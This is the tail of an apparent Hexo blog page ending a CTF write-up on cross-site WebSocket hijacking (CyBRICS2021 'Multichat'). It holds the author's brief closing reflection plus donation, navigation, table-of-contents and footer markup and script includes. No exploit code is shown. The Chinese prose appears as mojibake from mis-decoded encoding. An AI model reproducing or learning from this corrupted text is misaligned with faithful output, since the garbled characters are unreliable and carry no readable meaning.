<p>ä¸€å¼€å§‹åšè¿™é¢˜ï¼Œnamanæ›¾è¯•å›¾çˆ†ç ´ï¼Œæˆ‘å‘ä»–æå‡ºè¿™é¢˜ä¸å¤ªå¯èƒ½æ˜¯çˆ†ç ´æ‰¾åˆ°ç§˜å¯†æˆ¿é—´ã€‚åæ¥è™½ç„¶æ‰¾åˆ°äº†å…³äºè·¨ç«™WebSocketåŠ«æŒçš„èµ„æ–™ï¼Œä½†æ˜¯ç”±äºæœ¬äººæŠ€æœ¯æ°´å¹³æ‰€é™ï¼ˆå’Œä»¤äººğŸ˜…çš„éªŒè¯å¤±è´¥é—®é¢˜ï¼‰æœ€ç»ˆæ²¡æœ‰åšå‡ºè¿™ä¸€é¢˜ï¼Œèµ›åå¤ç°æ‰€ç”¨çš„è„šæœ¬å¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†Sndavå“¥å“¥çš„exp</p>
<p>æ°´å¹³å°šå¾…æé«˜ï¼Œä»éœ€åŠªåŠ›</p>

      </section>
      <section class="extra">
        
        
          <section class="donate">
  <div id="qrcode-donate">
    <img   class="lazyload" data-original="/images/myimg/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
  </div>
  <div class="icon">
    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
  </div>
</section>
        
        
  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cross-site-WebSocket-hijacking/" rel="tag">Cross-site WebSocket hijacking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul> 

        
  <nav class="nav">
    <a href="/2021/08/12/dailywp2/"><i class="iconfont iconleft"></i>æ—¥å¸¸åˆ·é¢˜è®°å½•20210812</a>
    <a href="/2021/07/26/dailywp1/">æ—¥å¸¸åˆ·é¢˜è®°å½•20210726<i class="iconfont iconright"></i></a>
  </nav>

      </section>
      
    </section>
  </div>
</article></div>
      <div class="col-xl-3">
        
          
  <aside class="toc-wrap">
    <h3 class="toc-title">æ–‡ç« ç›®å½•ï¼š</h3>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CyBRICS2021-Multichat"><span class="toc-text">[CyBRICS2021]Multichat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E8%A7%88"><span class="toc-text">æ€»è§ˆ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%80%9D%E8%B7%AF"><span class="toc-text">å¯»æ‰¾æ€è·¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-cross-site-WebSocket-hijacking"><span class="toc-text">What is cross-site WebSocket hijacking?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E6%94%BB%E5%87%BB"><span class="toc-text">å®æ–½æ”»å‡»</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%84%9F%E6%83%B3%E5%92%8C%E6%80%BB%E7%BB%93"><span class="toc-text">æ„Ÿæƒ³å’Œæ€»ç»“</span></a></li></ol>
  </aside>

        
      </div>
    </div>
  </div>
</main>
  

<footer class="footer">
  <div class="footer-social"><a 
        href="tencent://message/?Menu=yes&uin=3067733270 "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#12B7F5'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconQQ "></i>
      </a><a 
        href="javascript:; "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#09BB07'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconwechat-fill "></i>
      </a><a 
        href="mailto:3067733270@qq.com "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color=#FF3B00" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconmail"></i>
      </a></div>
  
    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
  
</footer>
  
      <div class="fab fab-plus">
    <i class="iconfont iconplus"></i>
  </div>
  
  
  <div class="fab fab-up">
    <i class="iconfont iconcaret-up"></i>
  </div>
  
  
  
    
<script src="/js/color-mode.js"></script>

  
  
</body>

<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>



  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>




  
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>






  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>




<script src="/js/utils.js"></script>
<script src="/js/script.js"></script>







  <script>
    (function () {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>













</html>